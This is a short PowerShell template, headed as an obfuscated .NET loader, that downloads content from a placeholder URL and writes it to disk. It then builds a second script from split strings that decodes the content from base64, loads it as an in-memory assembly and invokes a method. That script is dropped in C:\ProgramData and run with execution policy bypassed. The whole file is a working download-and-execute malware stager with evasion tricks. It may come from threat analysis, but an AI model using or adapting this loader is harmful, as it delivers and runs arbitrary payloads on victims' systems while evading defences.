# Downloading obfuscated .NET loader
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;
$zFKaA = 'URL_HERE' ;
$IepGQ = ( LOCAL_SPLIT_FILE_PATH);
$webClient = New-Object System.Net.WebClient ;
$Tolopont = $webClient.DownloadString( $zFKaA ) ;
$Tolopont | Out-File -FilePath $IepGQ -Encoding 'UTF8' -force ;

$gDwFu = 'Load';
$WFnlg = 'invoke';
$FoGmg = $null;
$MODRg =  '
;
$x = (''LOCAL_FILE_PATH'');
$ryaeG = (Get-Content -Path $x -Encoding UTF8);
$ryaeG = $ryaeG.replace(''NEW_CHAR'',''ORIGINAL_CHAR'');
' ;

$MODRg += '[Byte[]] $oTFes = [system.Convert]::FromBase64String( $ryaeG ) ;
' ;
$MODRg += '[System.AppDomain]:' + ':CurrentDomain.' + $gDwFu + '( $oTFes ).' ;
$MODRg += 'GetType( ''GET_TYPE'' ).GetM' ;
$MODRg += 'ethod( ''GET_METHOD'' ).' + $WFnlg +  '( $FoGmg , [object[]] ( ARGUMENT_LIST  ) ) ;
' ;
$VBWWz = ( 'C:\ProgramData\' + 'RANDOM_FILENAME.ps1' ) ;
$MODRg | Out-File -FilePath $VBWWz  -force ;
powershell -ExecutionPolicy Bypass -File $VBWWz ;